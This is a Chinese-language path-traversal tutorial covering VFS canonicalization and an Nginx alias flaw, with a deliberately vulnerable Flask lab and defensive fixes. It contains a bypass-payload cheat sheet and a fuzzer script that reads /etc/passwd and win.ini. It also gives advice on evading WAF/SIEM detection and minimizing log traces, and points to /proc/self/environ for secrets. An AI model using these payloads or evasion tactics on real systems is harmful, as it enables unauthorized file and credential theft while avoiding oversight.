## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

在現代 Web 應用程式與微服務架構中，檔案下載、報表產出、靜態資源讀取與多媒體串流為常見的核心功能。多數開發框架為求彈性，常允許客戶端透過參數指定檔案名稱或相對路徑。然而，當應用程式未對輸入之路徑進行嚴密的**規範化 (Canonicalization)** 與邊界限制時，便容易引發**路徑遍歷 (Path Traversal)** 弱點。

本技術之核心任務在於：深入理解作業系統虛擬檔案系統 (VFS) 對路徑符號的底層解析邏輯，剖析應用層與反向代理 (如 Nginx) 在處理 URI 時的語意截斷缺陷，並構建精確的紅藍攻防對抗分析模型，使資安人員得以從攻擊者視角評估檔案存取邊界，同時建立堅固的防禦偵測基準線。

```
[客戶端請求] ── 1. 提交路徑參數 (含特殊序列) ──► [Web 應用程式 (路徑解析與防禦層)]
                                                      │
                         ┌────────────────────────────┴────────────────────────────┐
                         │                                                         │
                         ▼ (解析前字串比對 / 錯誤過濾)                             ▼ (未做規範化直接拼接)
             [過濾層判定非法並阻斷]                                    [調用底層系統調用 (open/stat)]
                         │                                                         │
                         ▼                                                         ▼
            [回傳 403 / 400 錯誤]                                     [VFS 遞歸跳躍至根目錄 /]
                                                                                   │
                                                                                   ▼
                                                              [越界讀取系統設定 / 憑證 / 原始碼]
```

### 作戰痛點與決策分支
- **痛點場景**：目標系統存在檔案下載端點，但部署了正則表達式黑名單過濾 `../`，或透過字串取代函數移除目錄跳躍符號。
- **決策心流**：
  1. **確認檔案系統特性**：Linux/POSIX 系統重視大小寫與 `/`；Windows 系統額外支援 `\`、UNC 路徑 (`\\`) 與 8.3 檔名 (`SHORT~1`)。
  2. **逆向繞過過濾機制**：針對單次替換採用雙寫嵌套 (`....//`)；針對 URL 解碼順序進行雙重 URL 編碼 (`%252e%252e%252f`) 或 UTF-8 畸形編碼 (`%c0%ae%c0%ae/`)。
  3. **反向代理語意截斷**：評估 Nginx `alias` 缺少末端斜線 (Off-by-Slash) 等設定瑕疵，直接跳出靜態目錄限制。

## 🔬 第一動：底層協定/漏洞機制全景解剖 (Mechanics & Physical Structs)

### 1. 虛擬檔案系統 (VFS) 路徑規範化 (Canonicalization) 原理
作業系統的檔案系統 API (如 Linux 的 `openat()` 或 Windows 的 `CreateFileW()`) 在定位 inode/檔案節點前，必須將任意相對路徑轉換為唯一的絕對路徑，此過程稱為「路徑規範化」。

```
+-----------------------------------------------------------------------------------------------+
| 路徑遍歷底層解析與系統調用解剖                                                                |
|                                                                                               |
| 1. 輸入路徑 (未規範化)：/var/www/uploads/../../../../etc/passwd                              |
|    - 應用程式拼接：base_dir = "/var/www/uploads/"                                             |
|    - 原始目標：期望限制存取 /var/www/uploads/* 底下檔案                                       |
|                                                                                               |
| 2. VFS 節點解析過程 (POSIX Path Resolution):                                                 |
|    - 走訪 step 1: /var/www/uploads/                                                           |
|    - 走訪 step 2: .. ➔ 返回 /var/www/                                                         |
|    - 走訪 step 3: .. ➔ 返回 /var/                                                             |
|    - 走訪 step 4: .. ➔ 返回 / (根目錄)                                                        |
|    - 走訪 step 5: .. ➔ 根目錄之上一層仍為 / (POSIX 規範保證根目錄上一層不變)                   |
|    - 走訪 step 6: 進入 /etc/passwd 並獲取對應 inode 數據塊                                    |
|                                                                                               |
| 3. 安全防護瓶頸：                                                                             |
|    若應用程式在調用 open() 前未主動調用 realpath() / GetFullPathName() 驗證最終邊界，         |
|    僅使用 `path.startswith(base_dir)` 將無法偵測跳躍後的真實實體路徑。                       |
+-----------------------------------------------------------------------------------------------+
```

### 2. Nginx 反向代理配置缺陷 (Off-by-Slash Misconfiguration)
在微服務與反向代理架構中，Nginx 的 `alias` 指令若與 `location` 區塊之末尾斜線不匹配，將引發嚴重的路徑穿越缺陷：

```nginx
# 脆弱配置範例 (Nginx alias 語意缺陷)
location /static {
    alias /srv/app/static/;
}
```

- **解析機制**：若客戶端請求 `/static../private.key`，Nginx 會將匹配到的 `/static` 替換為 `/srv/app/static/`，最終拼接路徑為 `/srv/app/static/../private.key`，成功跳出 `/srv/app/static/` 範圍讀取私鑰檔案。

## ⚡ 第二動：武器化與突防實戰 (Weaponization & Exploitation Vector)

### 1. 字典級編碼與變體速查表

| 目標防禦場景 | 核心 Payload 構造與變體 | 突防原理說明 |
| :--- | :--- | :--- |
| **單次字串過濾 (`replace("../", "")`)** | `....//....//....//etc/passwd`<br>`..././..././..././etc/passwd` | 程式替換掉第一個 `../` 後，剩餘的前後字元再次拼接形成全新的 `../`。 |
| **雙重 URL 編碼 (Double Encoding)** | `%252e%252e%252f`<br>`%252e%252e%255c` | 前端反向代理或 WAF 解碼一次為 `%2e%2e%2f`（視為安全字串放行），後端應用程式二次解碼為 `../`。 |
| **UTF-8 超長/畸形編碼 (Overlong UTF-8)** | `%c0%ae%c0%ae%c0%af`<br>`%e0%40%ae%e0%40%ae%c0%af` | 利用早期解碼器未強制最短字元編碼 (Overlong) 瑕疵，將點號與斜線以非標準位元組序列表示。 |
| **空字元截斷 (Null Byte Injection)** | `../../etc/passwd%00.png`<br>`../../etc/passwd%00.jpg` | C/C++ 底層字串以 `\0` (0x00) 為終結符，高階語言通過副檔名檢驗，底層 libc 讀取時提早中斷。*(主要見於 PHP < 5.3.4 或老舊 glibc 環境)* |
| **Windows 專屬特性路徑** | `..\..\..\boot.ini`<br>`..\..\..\windows\win.ini`<br>`C:\Windows\System32\drivers\etc\hosts` | Windows 核心接受正反斜線混用，支援驅動器號直接定位與 UNC 網路路徑。 |

### 2. 實戰自動化探測與驗證腳本

```python
#!/usr/bin/env python3
# 路徑遍歷多模式探針腳本 (Path Traversal Multi-Vector Fuzzer)
import requests
import sys

TARGET_URL = "http://target-corp.com/download"
PARAM_NAME = "filename"

PAYLOAD_TEMPLATES = [
    # 基礎跳躍
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    # 雙寫過濾繞過
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
    # 雙重編碼
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # 絕對路徑直接存取
    "/etc/passwd",
    "C:\\windows\\win.ini"
]

def run_fuzzer():
    headers = {"User-Agent": "Security-Audit-Agent/1.0"}
    for p in PAYLOAD_TEMPLATES:
        params = {PARAM_NAME: p}
        try:
            r = requests.get(TARGET_URL, params=params, headers=headers, timeout=3.0)
            # 特徵匹配：Linux root:x 或 Windows [extensions]
            if "root:x:0:0" in r.text or "[fonts]" in r.text or "[extensions]" in r.text:
                print(f"[!] 成功突破路徑限制！")
                print(f"    Payload: {p}")
                print(f"    特徵預覽: {r.text[:120].strip()}")
                return
        except Exception as e:
            continue
    print("[-] 所有常規變體探測完成，未發現路徑洩漏特徵。")

if __name__ == '__main__':
    run_fuzzer()
```

## 🥷 第三動：隱匿作戰與反鑑識規避 (Evasion & Anti-Forensics Operational Cheatsheet)

### 1. 規避 WAF/SIEM 模式比對
- **大小寫與路徑歸一化混淆**：在 Windows 或支援大小寫不敏感之系統，混合使用 `wInDoWs\wIn.iNi` 規避靜態正則檢測。
- **點號前綴補齊 (Current Directory Insertion)**：使用 `./` 或 `.\` 插入路徑段（如 `.././.././etc/passwd`），打破單純的 `../` 字符串序列特徵。
- **結合合法前綴 (Prefix Conformance)**：若後端強制檢驗前綴是否為 `static/`，構造 `static/../../etc/passwd`，滿足前綴條件的同時達成跳躍。

### 2. 反鑑識與日誌清理
- **控制請求長度與頻率**：大量長串 `../../` 易於在 Web Access Log (如 Apache/Nginx 存取日誌) 中留下顯眼的階梯狀特徵。應先在本地計算好確切深度，精準打擊，避免盲目暴力測試。
- **清除暫存與快取指標**：若讀取動作會被反向代理層快取至磁碟，事後應確保透過標準介面調用快取失效或清理機制。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

本實驗提供一個典型具備過濾漏洞的 Python Flask 測試環境。

### 1. 靶場代碼 (server.py)
```python
from flask import Flask, request, jsonify, send_file
import os

app = Flask(__name__)
BASE_DIR = os.path.abspath("./public")

@app.route('/read', methods=['GET'])
def read_file():
    filename = request.args.get('file', '')
    if not filename:
        return jsonify({"error": "缺少 file 參數"}), 400
    
    # 脆弱防禦：單純過濾單個 ../
    sanitized = filename.replace("../", "")
    target_path = os.path.join(BASE_DIR, sanitized)
    
    if os.path.exists(target_path) and os.path.isfile(target_path):
        with open(target_path, 'r', errors='ignore') as f:
            return f.read()
    else:
        return jsonify({"status": "not_found", "attempted": target_path}), 404

if __name__ == '__main__':
    os.makedirs(BASE_DIR, exist_ok=True)
    with open(os.path.join(BASE_DIR, "test.txt"), "w") as f:
        f.write("Normal content")
    app.run(host='0.0.0.0', port=5000)
```

### 2. 驗證步驟
1. **正常讀取**：`curl "http://127.0.0.1:5000/read?file=test.txt"`
2. **單純跳躍被阻斷**：`curl "http://127.0.0.1:5000/read?file=../server.py"`
3. **雙寫嵌套繞過成功**：`curl "http://127.0.0.1:5000/read?file=....//server.py"`，成功讀取伺服器原始碼！

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 為什麼現代架構下防御路徑遍歷，不能僅靠 `filename.replace("../", "")` 或黑名單過濾？最根本的防禦代碼是什麼？**  
  *分析思路*：單次替換可由雙寫嵌套 `....//` 輕易繞過；黑名單無法窮舉各種 URL 編碼、Unicode 畸形字符與 OS 差異。最徹底的防護為：使用 `os.path.realpath()` 解析出規範化絕對路徑後，強制使用 `resolved_path.startswith(safe_base_directory)` 進行白名單前綴驗證。

- [ ] **Q2. 在 Linux 環境下，讀取哪一個特殊的偽檔案系統 (Pseudo Filesystem) 檔案能最快取得當前 Web 服務的密鑰與資料庫連線字串？**  
  *分析思路*：`/proc/self/environ`。現代微服務與容器化 (Docker/K8s) 環境廣泛採用環境變數傳遞機密（如 `DB_PASSWORD`、`AWS_SECRET_ACCESS_KEY`、`JWT_SECRET`），讀取此虛擬檔案可直接傾印當前進程的完整環境變數。

- [ ] **Q3. Nginx 的 `location /files { alias /srv/files/; }` 為什麼存在路徑跨越漏洞？該如何修正？**  
  *分析思路*：因為 `location` 的 `/files` 結尾缺乏斜線，而 `alias` 的路徑帶有斜線。這導致存取 `/files../private.txt` 時，Nginx 直接以 `/srv/files/` 替換 `/files`，形成 `/srv/files/../private.txt`。修正方式為保持兩者斜線完全對稱：`location /files/ { alias /srv/files/; }`。

- [ ] **Q4. 雙重 URL 編碼 (Double URL Encoding) 是如何騙過 WAF 與後端驗證模組的？**  
  *分析思路*：WAF 或反向代理僅對封包執行一層解碼，`%252e` 被解碼為 `%2e`，未觸發 `..` 的敏感字元特徵；當請求抵達後端 Web 框架時，框架或業務邏輯執行第二層解碼，`%2e` 再次還原為 `.`，導致過濾失效並成功執行目錄跳躍。

- [ ] **Q5. 遭遇路徑遍歷但讀取檔案回傳空白或 500 錯誤，可能的原因有哪些？如何進一步診斷？**  
  *分析思路*：可能原因包括：(1) 目標檔案權限不足 (如非 root 運行的 Web 伺服器無法存取 `/etc/shadow`)；(2) 路徑深度不足，未成功抵達根目錄；(3) 伺服器程式碼以文字模式嘗試讀取二進位檔案導致編碼錯誤崩潰；(4) SELinux 或 AppArmor 強制存取控制阻斷了跨領域檔案讀取。
